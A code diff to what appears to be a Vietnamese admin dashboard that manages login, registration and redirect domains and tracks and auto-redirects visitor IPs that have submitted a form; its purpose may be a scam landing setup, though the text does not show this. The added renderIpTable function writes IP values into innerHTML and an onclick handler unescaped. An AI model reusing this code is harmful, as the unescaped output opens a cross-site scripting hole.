@@ -404,6 +404,10 @@
         <div class="stat-value" id="totalLogins">0</div>
         <div class="stat-label">Đăng nhập</div>
       </div>
+      <div class="stat-card">
+        <div class="stat-value" id="totalIPs">0</div>
+        <div class="stat-label">IP đã điền Form</div>
+      </div>
     </div>
 
     <!-- Domain & CSKH Link Settings Card -->
@@ -439,6 +443,13 @@
             <input type="text" id="regDomain" value="<%= domainConfig.regDomain %>" placeholder="reg.example.com" />
             <div class="domain-status <%= domainConfig.regDomain ? 'active' : 'empty' %>" id="statusReg">
               <%= domainConfig.regDomain || 'Chưa thiết lập' %>
+            </div>
+          </div>
+          <div class="form-item">
+            <label>Thời gian chuyển hướng (giây)</label>
+            <input type="number" id="redirectDelay" value="<%= domainConfig.redirectDelay || '0' %>" placeholder="Ví dụ: 0, 2, 3, 5" min="0" step="1" />
+            <div class="domain-status <%= (domainConfig.redirectDelay && domainConfig.redirectDelay !== '0') ? 'active' : '' %>" id="statusRedirectDelay">
+              <%= (domainConfig.redirectDelay && domainConfig.redirectDelay !== '0') ? domainConfig.redirectDelay + ' giây' : '0 giây (Ngay lập tức)' %>
             </div>
           </div>
         </div>
@@ -480,6 +491,23 @@
       </form>
     </div>
 
+    <!-- IP Management Card -->
+    <div class="card">
+      <div class="card-header">
+        <div class="card-title"><span class="icon">🛡️</span> Quản lý IP đã điền Form (Tự động chuyển hướng)</div>
+        <div style="display: flex; gap: 8px; align-items: center; flex-wrap: wrap;">
+          <button class="btn-delete-all" onclick="clearAllIps()">🗑️ Xóa tất cả IP</button>
+        </div>
+      </div>
+      <div style="margin-bottom: 16px; display: flex; gap: 10px; flex-wrap: wrap; align-items: center;">
+        <input type="text" id="newIpInput" placeholder="Nhập địa chỉ IP mới (ví dụ: 1.2.3.4)" style="padding: 10px 14px; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; background: rgba(15, 23, 42, 0.6); color: #fff; flex: 1; min-width: 220px; outline: none; font-size: 14px;" />
+        <button class="btn-submit" style="padding: 10px 20px; min-height: 40px;" onclick="addIpManually()">➕ Thêm IP</button>
+      </div>
+      <div class="table-container" id="ipContainer">
+        <div class="empty-logs">Đang tải danh sách IP...</div>
+      </div>
+    </div>
+
     <!-- Activity Logs Card -->
     <div class="card">
       <div class="card-header">
@@ -517,6 +545,7 @@
             loginDomain: document.getElementById('loginDomain').value,
             regDomain: document.getElementById('regDomain').value,
             cskhLink: document.getElementById('cskhLink').value,
+            redirectDelay: document.getElementById('redirectDelay').value,
           })
         });
         if (res.status === 401) {
@@ -585,12 +614,19 @@
     // Update domain UI fields
     // ============================================================
     function updateDomainStatus(config) {
-      ['redirect', 'login', 'reg', 'cskh'].forEach(key => {
-        const domainKey = key === 'cskh' ? 'cskhLink' : key + 'Domain';
+      ['redirect', 'login', 'reg', 'cskh', 'redirectDelay'].forEach(key => {
+        let domainKey = key + 'Domain';
+        if (key === 'cskh') domainKey = 'cskhLink';
+        if (key === 'redirectDelay') domainKey = 'redirectDelay';
+
         const el = document.getElementById('status' + key.charAt(0).toUpperCase() + key.slice(1));
         if (el) {
           const val = config[domainKey];
-          el.textContent = val || 'Chưa thiết lập';
+          if (key === 'redirectDelay') {
+            el.textContent = (val && val !== '0') ? val + ' giây' : '0 giây (Ngay lập tức)';
+          } else {
+            el.textContent = val || 'Chưa thiết lập';
+          }
           el.className = 'domain-status ' + (val ? 'active' : 'empty');
         }
       });
@@ -618,11 +654,17 @@
 
         // Update statistics
         const logs = data.recentLogs || [];
+        const ips = data.ips || [];
+
         document.getElementById('totalLogs').textContent = logs.length;
         document.getElementById('totalRegisters').textContent =
           logs.filter(l => l.action === 'register').length;
         document.getElementById('totalLogins').textContent =
           logs.filter(l => l.action === 'login').length;
+        document.getElementById('totalIPs').textContent = ips.length;
+
+        // Render IP list
+        renderIpTable(ips);
 
         // Populate Env Config values once
         if (data.env && !configPopulated) {
@@ -669,9 +711,104 @@
       }
     }
 
-    // ============================================================
+    // Render IP Table
+    function renderIpTable(ips) {
+      const container = document.getElementById('ipContainer');
+      if (!ips || ips.length === 0) {
+        container.innerHTML = '<div class="empty-logs">Chưa có IP nào điền form</div>';
+        return;
+      }
+
+      let html = '<table class="log-table"><thead><tr>' +
+        '<th>Địa chỉ IP</th><th>Thời gian đầu</th><th>Lần truy cập cuối</th><th>Lượt</th><th>Hành động</th>' +
+        '</tr></thead><tbody>';
+
+      ips.slice().reverse().forEach((item) => {
+        const ipStr = typeof item === 'string' ? item : item.ip;
+        const timeStr = typeof item === 'object' ? (item.time || '-') : '-';
+        const lastSeenStr = typeof item === 'object' ? (item.lastSeen || timeStr) : '-';
+        const count = typeof item === 'object' ? (item.count || 1) : 1;
+
+        html += '<tr>' +
+          '<td><code style="font-weight: 600; color: #f9752d;">' + ipStr + '</code></td>' +
+          '<td>' + timeStr + '</td>' +
+          '<td>' + lastSeenStr + '</td>' +
+          '<td><span class="badge badge-login">' + count + '</span></td>' +
+          '<td><button class="btn-delete-item" onclick="deleteIp(\'' + ipStr + '\')">🗑️ Xóa IP</button></td>' +
+          '</tr>';
+      });
+
+      html += '</tbody></table>';
+      container.innerHTML = html;
+    }
+
+    // Add IP manually
+    async function addIpManually() {
+      const input = document.getElementById('newIpInput');
+      const ip = input.value.trim();
+      if (!ip) {
+        alert('Vui lòng nhập địa chỉ IP');
+        return;
+      }
+      try {
+        const res = await fetch('/admin/api/ips/add', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ip })
+        });
+        const data = await res.json();
+        if (data.success) {
+          input.value = '';
+          loadStatus();
+        } else {
+          alert('Lỗi: ' + (data.error || 'Không thể thêm IP'));
+        }
+      } catch (err) {
+        alert('Lỗi khi thêm IP: ' + err.message);
+      }
+    }
+
+    // Delete single IP
+    async function deleteIp(ip) {
+      if (!confirm('Bạn có chắc muốn xóa IP này khỏi danh sách chuyển hướng? (' + ip + ')')) return;
+      try {
+        const res = await fetch('/admin/api/ips/delete', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ip })
+        });
+        const data = await res.json();
+        if (data.success) {
+          loadStatus();
+        } else {
+          alert('Lỗi: ' + (data.error || 'Không thể xóa IP'));
+        }
+      } catch (err) {
+        alert('Lỗi khi xóa IP: ' + err.message);
+      }
+    }
+
+    // Clear all IPs
+    async function clearAllIps() {
+      if (!confirm('Bạn có chắc muốn XÓA TOÀN BỘ danh sách IP tự động chuyển hướng?')) return;
+      try {
+        const res = await fetch('/admin/api/ips/delete', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ clearAll: true })
+        });
+        const data = await res.json();
+        if (data.success) {
+          loadStatus();
+        } else {
+          alert('Lỗi: ' + (data.error || 'Không thể xóa danh sách IP'));
+        }
+      } catch (err) {
+        alert('Lỗi khi xóa danh sách IP: ' + err.message);
+      }
+    }
+
     // Delete single log
-    // ============================================================
     async function deleteLog(id, index) {
       if (!confirm('Bạn có chắc chắn muốn xóa bản ghi nhật ký này?')) return;
       try {
@@ -691,9 +828,7 @@
       }
     }
 
-    // ============================================================
     // Delete all logs
-    // ============================================================
     async function clearAllLogs() {
       if (!confirm('Bạn có chắc chắn muốn xóa TOÀN BỘ nhật ký hoạt động?')) return;
       try {
